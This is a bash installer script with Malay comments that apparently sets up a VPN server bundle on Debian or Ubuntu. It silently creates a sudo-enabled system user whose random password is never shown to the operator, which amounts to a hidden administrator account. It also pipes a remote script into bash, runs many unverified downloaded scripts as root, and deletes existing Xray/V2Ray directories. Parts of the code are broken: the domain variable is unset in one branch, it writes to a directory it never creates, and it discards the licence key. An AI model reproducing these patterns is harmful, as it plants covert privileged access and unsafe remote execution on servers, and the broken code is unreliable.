#!/bin/bash
# (C) Copyright 2022 Oleh KaizenVPN
# ===================================================================
# Nama        : Autoskrip VPN
# Info        : Memasang pelbagai jenis servis vpn didalam satu skrip
# Dibuat Pada : 30-08-2022 ( 30 Ogos 2022 )
# OS Support  : Ubuntu & Debian
# Owner       : KaizenVPN
# Telegram    : https://t.me/KaizenA
# Github      : github.com/rewasu91
# Lesen       : MIT License
# ===================================================================

# // Export Warna & Maklumat
export RED='\033[0;31m';
export GREEN='\033[0;32m';
export YELLOW='\033[0;33m';
export BLUE='\033[0;34m';
export PURPLE='\033[0;35m';
export CYAN='\033[0;36m';
export LIGHT='\033[0;37m';
export NC='\033[0m';

# // Export Maklumat Status Banner
export ERROR="[${RED} ERROR ${NC}]";
export INFO="[${YELLOW} INFO ${NC}]";
export OKEY="[${GREEN} OKEY ${NC}]";
export PENDING="[${YELLOW} PENDING ${NC}]";
export SEND="[${YELLOW} SEND ${NC}]";
export RECEIVE="[${YELLOW} RECEIVE ${NC}]";
export RED_BG='\e[41m';

# // Export Align
export BOLD="\e[1m";
export WARNING="${RED}\e[5m";
export UNDERLINE="\e[4m";

# // Export Maklumat Sistem OS
export OS_ID=$( cat /etc/os-release | grep -w ID | sed 's/ID//g' | sed 's/=//g' | sed 's/ //g' );
export OS_VERSION=$( cat /etc/os-release | grep -w VERSION_ID | sed 's/VERSION_ID//g' | sed 's/=//g' | sed 's/ //g' | sed 's/"//g' );
export OS_NAME=$( cat /etc/os-release | grep -w PRETTY_NAME | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' );
export OS_KERNEL=$( uname -r );
export OS_ARCH=$( uname -m );

# // String Untuk Membantu Pemasangan
export VERSION="1.0";
export EDITION="Stable";
export AUTHER="KaizenVPN";
export ROOT_DIRECTORY="/etc/kaizenvpn";
export CORE_DIRECTORY="/usr/local/kaizenvpn";
export SERVICE_DIRECTORY="/etc/systemd/system";
export SCRIPT_SETUP_URL="https://raw.githubusercontent.com/rewasu91/scvps/main/setup.sh";
export REPO_URL="https://github.com/rewasu91/scvps";

# // Semak kalau anda sudah running sebagai root atau belum
if [[ "${EUID}" -ne 0 ]]; then
		echo -e " ${ERROR} Sila jalankan skrip ini sebagai root user";
		exit 1
fi

# // Membuat Directory Utama
if [[ -r /usr/local/kaizenvpn/ ]]; then
        echo -e "${ERROR} Skrip sudah dipasang !"
        sleep 3
        clear
        echo ""
        echo -e "            ${RED} ! AMARAN !${NC}"
        echo -e "kalau anda reinstall skrip ini, anda akan kehilangan"
        echo -e "semua data skrip seperti data pelanggan dan lain-lain"
        echo -e "kalau anda yakin untuk meneruskan, sila taip okey"
        echo -e ""
        read -p "Sila taip 'okey' untuk mengesahkan memasang semula skrip : " configm
        if [[ $configm == "okey" ]]; then
                clear
                echo -e "${OKEY} Baiklah, sistem akan mula memasang semula skrip";
                sleep 1
        else
                clear
                echo -e "${ERROR} Pemasangan semula skrip telah dibatalkan";
                exit 1
        fi
        export STATUS_SC1="reinstall"
else
        export passed=true # Script Not Detected
fi

# // Membuat Folder
rm -rf /etc/kaizenvpn/;
rm -rf /usr/local/kaizenvpn/;
rm -rf /etc/v2ray/;
rm -rf /etc/xray/;
mkdir -p /etc/kaizenvpn/;

# // Menetapkan masa
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;

# // Persetujuan peraturan
wget -q -O /etc/kaizenvpn/Rules "https://raw.githubusercontent.com/rewasu91/scvpssettings/main/rules.txt";
clear;
cat /etc/kaizenvpn/Rules;
echo "";
echo -e "Untuk meneruskan pemasangan skrip, sila baca dan setuju dengan peraturan kami dengan menaip '${YELLOW}okey${NC}'";
echo "";
read -p 'Sila taip 'okey' : ' accepted_rules;
if [[ $accepted_rules == "okey" ]]; then
    echo "";
    echo -e "${OKEY} Anda telah bersetuju dengan peraturan kami. Sistem akan memulakan pemasangan skrip dalam masa 3 saat.";
    sleep 3;
    clear;
else
    rm -rf /etc/kaizenvpn/;
    rm -rf /usr/local/kaizenvpn/;
    echo "";
    echo -e "${ERROR} Maaf, anda tidak boleh meneruskan pemasangan skrip kerana anda tidak bersetuju dengan peraturan kami.";
    exit 1;
fi 

# // Create local folder
mkdir -p /usr/local/kaizenvpn/;
mkdir -p /etc/kaizenvpn/bin/;
mkdir -p /etc/kaizenvpn/local/;
mkdir -p /etc/kaizenvpn/sbin/;
mkdir -p /etc/kaizenvpn/snc-relay/;
mkdir -p /etc/kaizenvpn/python-vrt/;
mkdir -p /etc/kaizenvpn/panel-controller/;
mkdir -p /etc/kaizenvpn/addons-controller/;
mkdir -p /etc/kaizenvpn/build/;
mkdir -p /etc/kaizenvpn/data/;

# // Update dan upgrade semua repository
apt update -y;
apt upgrade -y;
apt autoremove -y;
apt dist-upgrade -y;
apt install jq -y;
apt install wget -y;
apt install nano -y;
apt install curl -y;

# // Menyemak sistem sekiranya terdapat pemasangan yang kurang / No
if ! which jq > /dev/null; then
    echo -e "${ERROR} Pakej JQ tidak dipasang";
    exit 1
fi

# // Exporting maklumat rangkaian
wget -qO- --inet4-only 'https://raw.githubusercontent.com/rewasu91/scvpssettings/main/get-ip_sh' | bash;
source /root/ip-detail.txt;
export IP_NYA="$IP";
export ASN_NYA="$ASN";
export ISP_NYA="$ISP";
export REGION_NYA="$REGION";
export CITY_NYA="$CITY";
export COUNTRY_NYA="$COUNTRY";
export TIME_NYA="$TIMEZONE";

# // Exporting Banner
clear
echo -e "${YELLOW}---------------------------------------------------${NC}
   Selamat Datang ke KaizenVPN Skrip V1.0 Stable
Skrip ini akan memasang server vpn secara automatik
                Author : ${GREEN}KaizenVPN${NC}
        © Copyright 2022-2023 By ${GREEN}KaizenVpn${NC}
${YELLOW}---------------------------------------------------${NC}";

# // Pengesahan
echo -e "${OKEY} Versi Skrip [ ${GREEN}${VERSION} ${EDITION}${NC} ]";

# // Validating Architecture
if [[ $OS_ARCH == "x86_64" ]]; then
    echo -e "${OKEY} Architecture Supported [ $GREEN$OS_ARCH${NC} ]";
else
    echo -e "${ERROR} Architecture Supported [ $RED$OS_ARCH${NC} ]";
    exit 1;
fi

# // Mengesahkan Sistem OS support atau tidak
if [[ $OS_ID == "ubuntu" ]]; then
    # // Ubuntu Detected
    if [[ $OS_VERSION == "16.04" ]]; then
        # // Ubuntu 16.04
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "18.04" ]]; then
        # // Ubuntu 18.04
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "20.04" ]]; then
        # // Ubuntu 20.04
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "20.10" ]]; then
        # // Ubuntu 20.10
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "21.04" ]]; then
        # // Ubuntu 21.04
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "21.10" ]]; then
        # // Ubuntu 21.10
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "22.04" ]]; then
        # // Ubuntu 22.04
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "22.10" ]]; then
        # // Ubuntu 22.10
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    else
        # // No Supported OS
        echo -e "${ERROR} OS Not Supported [ ${RED}$OS_NAME${NC} ]";
        exit 1;
    fi
elif [[ $OS_ID == "debian" ]]; then
    # // Debian Detected
    if [[ $OS_VERSION == "8" ]]; then
        # // Debian 8
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "9" ]]; then
        # // Debian 9
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "10" ]]; then
        # // Debian 10
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "11" ]]; then
        # // Debian 11
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    elif [[ $OS_VERSION == "12" ]]; then
        # // Debian 12
        echo -e "${OKEY} OS Supported [ ${GREEN}$OS_NAME${NC} ]";
    else
        # // No Supported OS
        echo -e "${ERROR} OS Not Supported [ ${RED}$OS_NAME${NC} ]";
        exit 1;
    fi
else
    # // Operating Not Supported
    echo -e "${ERROR} Maaf, hanya support sistem Debian & Ubuntu sahaja";
    exit 1;
fi

# // Menyemak IP Address
if [[ $IP_NYA == "" ]]; then
    echo -e "${ERROR} IP Address tidak berjaya dikesan";
    exit 1;
else
    echo -e "${OKEY} IP Address berjaya dikesan [ ${GREEN}$IP_NYA${NC} ]";
fi

# // Menyemak ISP
if [[ $ISP_NYA == "" ]]; then
    echo -e "${ERROR} ISP tidak berjaya dikesan";
    exit 1;
else
    echo -e "${OKEY} ISP berjaya dikesan [ ${GREEN}$ISP_NYA${NC} ]";
fi

# // Menyemak Negara
if [[ $COUNTRY_NYA == "" ]]; then
    echo -e "${ERROR} Negara tidak berjaya dikesan";
    exit 1;
else
    echo -e "${OKEY} Negara berjaya dikesan [ ${GREEN}$COUNTRY_NYA${NC} ]";
fi

# // Menyemak Negeri
if [[ $REGION_NYA == "" ]]; then
    echo -e "${ERROR} Negari tidak berjaya dikesan";
    exit 1;
else
    echo -e "${OKEY} Negari berjaya dikesan [ ${GREEN}$REGION_NYA${NC} ]";
fi

# // Menyemak Bandar
if [[ $CITY_NYA == "" ]]; then
    echo -e "${ERROR} Bandar tidak berjaya dikesan";
    exit 1;
else
    echo -e "${OKEY} Bandar berjaya dikesan [ ${GREEN}$CITY_NYA${NC} ]";
fi
echo -e "${YELLOW}--------------------------------------------------${NC}"
echo "";
read -p "$(echo -e "${YELLOW} ~~~>${NC}") Sila masukkan lesen skrip anda : " lcn_key_inputed

# // Maklumat Ram
while IFS=":" read -r a b; do
    case $a in
        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
        "Shmem") ((mem_used+=${b/kB}))  ;;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
        mem_used="$((mem_used-=${b/kB}))"
    ;;
esac
done < /proc/meminfo
Ram_Usage="$((mem_used / 1024))";
Ram_Total="$((mem_total / 1024))";

# // Mendaftarkan pengguna skrip
Username="script-$( </dev/urandom tr -dc 0-9 | head -c5 )";
Password="$( </dev/urandom tr -dc 0-9 | head -c12 )";
mkdir -p /home/script/;
useradd -r -d /home/script -s /bin/bash -M $Username;
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1;
usermod -aG sudo $Username > /dev/null 2>&1;

# // Selamat Datang ke Proses Pemasangan
clear && echo -e "${OKEY} Memulakan proses pemasangan skrip.";

# // Info Versi Skrip
printf 'VERSION=1.0\nPATCH="4"\nNAME=Stable\nVERSION_ID="KaizenV1"' > /etc/kaizenvpn/version

# // Membuang Apache / Nginx kalau ada
apt remove --purge nginx -y;
apt remove --purge apache2 -y;
apt autoremove -y;

# // Memasang keperluan lain untuk skrip
apt install jq -y;
apt install net-tools -y;
apt install netfilter-persistent -y;
apt install openssl -y;
apt install iptables -y;
apt install iptables-persistent -y;
apt autoremove -y;

# // Memasang BBR & FQ
cat > /etc/sysctl.conf << END
# Sysctl Config By KaizenVPN
# ============================================================
# Please do not try to change / modif this config
# This file is for enable bbr & disable ipv6 
# if you modifed this, bbr & ipv6 disable will error
# ============================================================
# (C) Copyright 2022-2023 By KaizenVPN

# // Mengaktifkan IPv4 Forward
net.ipv4.ip_forward=1

# // Mematikan IPV6
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1

# // Mengaktifkan bbr & fq
net.core.default_qdisc=fq
net.ipv4.tcp_congestion_control=bbr
END
sysctl -p;

# // Memasang Socat & membuang nginx & apache kalau sudah dipasang
clear;
apt install socat -y;
apt install sudo -y;

# // Mengentikan servis
systemctl stop xray-mini@tls > /dev/null 2>&1
systemctl stop xray-mini@nontls > /dev/null 2>&1
systemctl stop nginx > /dev/null 2>&1
systemctl stop apache2 > /dev/null 2>&1

# // Mematikan port 80 & 443 kalau sudah digunakan
lsof -t -i tcp:80 -s tcp:listen | xargs kill > /dev/null 2>&1
lsof -t -i tcp:443 -s tcp:listen | xargs kill > /dev/null 2>&1

# // Setting Domain
clear;
echo "";
echo -e "${GREEN}Setting Domain${NC}";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo -e "Anda ingin Menggunakan Domain Sendiri ?";
echo -e "Atau ingin Menggunakan Domain Automatik ?";
echo -e "Jika ingin Menggunakan Domain Sendiri, sila taip ${GREEN}1${NC}";
echo -e "dan Jika Ingin menggunakan Domain Automatik, sila taip ${GREEN}2${NC}";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo "";
read -p "$( echo -e "${GREEN}Sila masukkan nombor pilihan anda: ${NC}(${YELLOW}1/2${NC})${NC} " )" choose_domain


# // Mengesahkan pilihan domain, samada 1 atau 2
if [[ $choose_domain == "2" ]]; then # // Using Automatic Domain

echo -e "${OKEY} Starting Generating Certificate";
rm -rf /root/.acme.sh;
mkdir -p /root/.acme.sh;
wget -q -O /root/.acme.sh/acme.sh "https://raw.githubusercontent.com/sshwsvpn/settings/main/acme.sh";
chmod +x /root/.acme.sh/acme.sh;
sudo /root/.acme.sh/acme.sh --register-account -m vpn-script@sshwsvpn.me;
sudo /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256 -ak ec-256;

# // Success
echo -e "${OKEY} Your Domain : $domain";
sleep 2;
clear;

# // ELif For Selection 1
elif [[ $choose_domain == "1" ]]; then

# // Clear
clear;
echo -e "${GREEN}Indonesian Language${NC}";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo -e "Silakan Pointing Domain Anda Ke IP VPS";
echo -e "Untuk Caranya Arahkan NS Domain Ke Cloudflare";
echo -e "Kemudian Tambahkan A Record Dengan IP VPS";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo "";
echo -e "${GREEN}Indonesian Language${NC}";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo -e "Please Point Your Domain To IP VPS";
echo -e "For Point NS Domain To Cloudflare";
echo -e "Change NameServer On Domain To Cloudflare";
echo -e "Then Add A Record With IP VPS";
echo -e "${YELLOW}-----------------------------------------------------${NC}";
echo "";
echo "";

# // Reading Your Input
read -p "Input Your Domain : " domain
domain=$( echo $domain | sed 's/ //g' );
if [[ $domain == "" ]]; then
    clear;
    echo -e "${ERROR} No Input Detected !";
    exit 1;
fi

# // Input Domain To VPS
echo "$domain" > /etc/sshwsvpn/domain.txt;
domain=$( cat /etc/sshwsvpn/domain.txt );

# // Making Certificate
clear;
echo -e "${OKEY} Starting Generating Certificate";
rm -rf /root/.acme.sh;
mkdir -p /root/.acme.sh;
wget -q -O /root/.acme.sh/acme.sh "https://raw.githubusercontent.com/sshwsvpn/settings/main/acme.sh";
chmod +x /root/.acme.sh/acme.sh;
sudo /root/.acme.sh/acme.sh --register-account -m vpn-script@sshwsvpn.me;
sudo /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256 -ak ec-256;

# // Success
echo -e "${OKEY} Your Domain : $domain";
sleep 2;
clear;

# // Else Do
else
    echo -e "${ERROR} Please Choose 1 & 2 Only !";
    exit 1;
fi

# // Installing Requirement
wget -q -O /root/requirement.sh "https://raw.githubusercontent.com/sshwsvpn/setup/main/setup/requirement.sh";
chmod +x requirement.sh;
./requirement.sh;

# // SSH & WebSocket Install
wget -q -O /root/ssh-ssl.sh "https://raw.githubusercontent.com/sshwsvpn/setup/main/setup/ssh-ssl.sh";
chmod +x ssh-ssl.sh;
./ssh-ssl.sh;

# // Nginx Install
wget -q -O /root/nginx.sh "https://raw.githubusercontent.com/sshwsvpn/setup/main/setup/nginx.sh";
chmod +x nginx.sh;
./nginx.sh;

# // XRay-Mini Install
wget -q -O /root/xray-mini.sh "https://raw.githubusercontent.com/sshwsvpn/setup/main/setup/xray-mini.sh";
chmod +x xray-mini.sh;
./xray-mini.sh;

# // SSH & SSL Install
wget -q -O /root/ssh-ssl.sh "https://raw.githubusercontent.com/sshwsvpn/setup/main/setup/ssh-ssl.sh";
chmod +x ssh-ssl.sh;
./ssh-ssl.sh;

# // OpenVPN Install
wget -q -O /root/ovpn.sh "https://raw.githubusercontent.com/sshwsvpn/setup/main/setup/ovpn.sh";
chmod +x ovpn.sh;
./ovpn.sh;

# // Wireguard Install
wget -q -O /root/wg-set.sh "https://raw.githubusercontent.com/sshwsvpn/setup/main/setup/wg-set.sh";
chmod +x wg-set.sh;
./wg-set.sh;

# // ShadowsocksR Install
wget -q -O /root/ssr.sh "https://raw.githubusercontent.com/sshwsvpn/setup/main/setup/ssr.sh";
chmod +x ssr.sh;
./ssr.sh;

# // Installing Menu
wget -q -O /root/menu-setup.sh "https://raw.githubusercontent.com/sshwsvpn/setup/main/menu/menu-setup.sh";
chmod +x menu-setup.sh;
./menu-setup.sh;

# // Done
clear;
echo -e "${OKEY} Script Successfull Installed";

# // Remove Not Used File
rm -rf /root/setup.sh
